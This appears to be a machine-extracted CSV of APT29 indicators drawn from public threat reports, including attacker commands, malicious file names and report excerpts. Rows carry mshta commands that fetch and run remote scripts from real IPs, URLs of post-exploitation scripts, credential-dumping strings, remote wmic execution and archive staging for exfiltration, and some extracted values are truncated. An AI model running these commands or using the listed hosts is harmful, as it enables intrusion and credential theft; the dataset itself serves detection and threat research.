schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:890bd7d5647264121d1e03028660b5b4694de6b469f706964d84ce897e854b20,observation--sha256:13394a7f15c4ddf99e3cc92880311e7c9a9fc74a5b8b978f5bfcef391fe900ba,command,• mshta hxxp://149 .154.157 .248:8080/SlaMn,• mshta http://149 .154.157 .248:8080/SlaMn,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:2d7a022def516fd8b7aa6336398eee4b59cb84135e3a4c787ea5f7596ac1921a,observation--sha256:9afc9f2fac5453f4bb425f88ef1a9eff3e9bfca14ce87ed90cac78966a657dd0,command,• powershell,• powershell,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:772a32c146817de8b8e256c4cb62bcc9ddc8756155c114ba076ecb810ef83c26,observation--sha256:5c0f8193b9de8804d5693f53eabc46cbe11a86e962dae02b499b2bbf5a1b37ad,command,• powershell Get-WindowsDriver -Online -All,• powershell Get-WindowsDriver -Online -All,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:b5b52f63ebcbd12aaf1db9fc2e7333dc4a3eac28d4811ec16df17c8c3fce02d6,observation--sha256:45ad0c1a077e6167eee0509851c3beaaf0dc63570eae041da02bb422aa5eaa76,command,• powershell Get-WmiObject -Class Win32_Service -Computername,• powershell Get-WmiObject -Class Win32_Service -Computername,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:9b53036bc02256b658581f516f05fc4848a0048a18506aeb78e81ced30e329bc,observation--sha256:48dc9c6616b58a3926f889694a24616ea4e3999478d0dd35cb6debcd7cecba61,command,"● cmd.exe /C ""chcp 65001 > NUL & whoami""● cmd.exe /C ""chcp 65001 > NUL & wmic datafile whereName=""C:\Windows\System32\ntoskrnl.exe"" get Version”● cmd.exe /C ""chcp 65001 > NUL & netstat -a""● cmd.exe /C ""chcp 65001 > NUL & tasklist","● cmd.exe /C ""chcp 65001 > NUL & whoami""● cmd.exe /C ""chcp 65001 > NUL & wmic datafile whereName=""C:\Windows\System32\ntoskrnl.exe"" get Version”● cmd.exe /C ""chcp 65001 > NUL & netstat -a""● cmd.exe /C ""chcp 65001 > NUL & tasklist",candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:ebd5101ce08b4615b6ce091e7ab2fd7c3a8215b7f599ab5bcb995fedf115c22f,observation--sha256:696abbf190461c7e73a8f3213780f3d34177d641d6768b3c299cfe7ee4ea7701,command," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties"," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:fb89286e2b02e6a7193361fcfabd74e1e1b81aced584998d8d23a2966b5c2907,observation--sha256:8b73ef3c102364cfba0590b8ffe2c60ccccfd45a904684dc44aca204cfa74bd8,command," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof"," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:b81713ed8cb42d9248147c1c9fce1b5c52602561b634e67c70eff33e729089bb,observation--sha256:55834d48448a01e641b4edb51fc17c21405972265b91db8efd8419fe8c5a4b41,command," powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL"," powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:9cb5f06c8cae14744d01749eb716017ad5263bc47417b8de6fe188f53f1ce4c1,observation--sha256:7f014ab518de0bc25dfe7b5acf3b2e4ce28c1a42d00157a0fba52f86a069aab3,command, powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath, powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:b93122a30e19ccb550ce46fa49505489d1a9d97e1f4fa463bdc90de00d6a6786,observation--sha256:e1271563f4cce8270cca0e10ddf625e70c2c40983c63d8eb7951e7a1376b0a64,command, powershell Get-WindowsDriver -Online -All, powershell Get-WindowsDriver -Online -All,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:8d50bd67c34c0b793d5721775bc6a33f66a4f449b8adabf83e6796157aff197f,observation--sha256:c28b2acad8d1362a82e0ed895f11970475724a26cd7eedb3877af1bd90223f26,command, powershell Get-WmiObject -Class Win32_Service -Computername, powershell Get-WmiObject -Class Win32_Service -Computername,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:9e61a2412f8981dfd895089554f1a35ea618a66849cb545b58c7027f78bcc0f2,observation--sha256:1b36527615ea9bc6a87fcae96b5696164ab594aa3bfc926855503a55c09cf310,command," wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create"," wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:7932d11b7bfc108c03eff89fbe2ff1bb8a223600aed0c10b200648c9dcb0a266,observation--sha256:bc09b90578ffe2da2cb5b27d02eacdbd4748a12b302af48a31827c98c88e9adc,command," wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief"," wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:10e2fc5541bd062b93b94553c35283a043e6440676a88b0681712c7e27385867,observation--sha256:461f60fa77a2e1cac69595ca3406a475060b7548a368e193867cfb1e479fe217,command," wmic /node:""""<redacted>"""" process list brief"," wmic /node:""""<redacted>"""" process list brief",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:35d6d270e670dea823366b759ed72414f9bda51c1fe2ce8e433b4fc3ff1e87bf,observation--sha256:f6a02c9e9f573c0b9d43c52c9c877c1b8fccf5b56039ec68c95da039f709f626,command, wmic process <proc_id> get commandline, wmic process <proc_id> get commandline,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:de2235d94d23fe8d0c0ab3bef82551a8211dd5ced446ce98ab4c1d0110891346,observation--sha256:f707d0784b1d595952ed020744d1f5dd6cdec571f8a9a72f078c098fbcf1e5fb,command," wmic process call create ""C:\Program Files\Windows Defender Advanced Threat"," wmic process call create ""C:\Program Files\Windows Defender Advanced Threat",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:075caccd00792c2537792c4084935d0d960d59b9865f5fc485504921a571f0ae,observation--sha256:ae93bb2eecbbb490c27809e9e7c67b3b9398e68af384b4d2c9296dbdbac01b68,command, wmic process get commandline -all, wmic process get commandline -all,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:0035a1d9dd410fa0af79a6c41f2f64e83399d03fa03310028b00ab6b2f85bd60,observation--sha256:19b724f2baf26083dfc997403f18060eef9d235fde5e299351030628d1c90231,command," wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed"," wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:df0e0e11b1a372b7dfa9d1d2db4e6c4ab0727cd098ed863f54fe9c9cce05a3c5,observation--sha256:182ab6c6d923f9de2dae2fdbf9d1a216bb6a2a0a12bc8cfb58ab03c6e7820431,file-name,46tt83y6.ps1,46tt83y6.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:498b131788e249a74bcd02c2addbf786f4259a02b5aa3aae5f8019e7b6078e38,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:01e8c5b8771d0ef05b30b00966225352694561f7430ef410bc96d2a9bd9285c3,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Malware The malicious ZIP file “schedule.zip”  SHA256cf160175c661efd4b1e1eecadf5f00f7203ef4c7445e36e3373d50b26086c552  was auto-downloadedfrom totalmassasje[.]no and contains three files, as shown inTable 1. Filename File Type SHA256 november_schedulexe.pdf EXE 844e902977b478eace8568f49dd9e5c91db8e534f3c5410ee663d0be02bdf7e3 vcruntime140.dll DLL a0c3e6cd167b93f4646a7a3f2d46ed8bd4888d861b533662a66ca9711d49db1f 7za.dll DLL 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:b8dfec6e57c40352c84ccd963bdaca71dfbd02f85c8de333bc72d4ccb7fd0373,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS be version 14.30.30704.0; however, a comparison with the legitimate version of the DLL  SHA256 081a273ad809f650ebaeb91c11fcc7a1ad91232a7228f8e98b52191fe44cb06d) reveals that the file hasbeen modified. A side-by-side comparison of each DLL’s Properties window is shown inFigure 6withthe legitimate version on the left and the modified version on the right. Notably, the modified versionhas also removed Microsoft’s digital signature. Figure 6 Comparison of the legitimate (left) ",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:ed0a84d0273f35cb7992a919e0655b55cad9f4421349181f988d561fc6d865e4,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:8ba6b46f0719d28240a13d44100e765f40013468c3cf5266aa30ac99afa1a9d1,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 4/11 IoC reference sheet SNOWYAMBER Indicator Value Sample dated 24/10/2022 File Name 7za.dll File Size 270,336B MD5 d0efe94196b4923eb644ec0b53d226cc SHA1 c938934c0f5304541087313382aee163e0c5239c SHA256 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c Indicator Value Sample dated 8/02/2023 File Name BugSplatRc64.dll File Size 271,360B MD5 cf36bf564fbb7d5ec4cec9b0f185f6c9 SHA1 8eb64670c10505322d45f6114bc9f7de0826e3a1 SHA256",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:b6b977af52b05c7706cbb6bb256c57e5f82a5e888ab935394c95408741249cb6,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 20/24 Appendix A – IOCs File IoCs Indicator Value Sample dated 24/10/2022 File Name 7za.dll File Size 270,336B MD5 d0efe94196b4923eb644ec0b53d226cc SHA1 c938934c0f5304541087313382aee163e0c5239c SHA256 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c Indicator Value Sample dated 8/02/2023 File Name BugSplatRc64.dll File Size 271,360B MD5 cf36bf564fbb7d5ec4cec9b0f185f6c9 SHA1 8eb64670c10505322d45f6114bc9f7de0826e3a1 SHA256 e",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:4ff453165f8c552d5338959d4725029573540556550d3adb82ba0372c71b2179,file-name,(7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
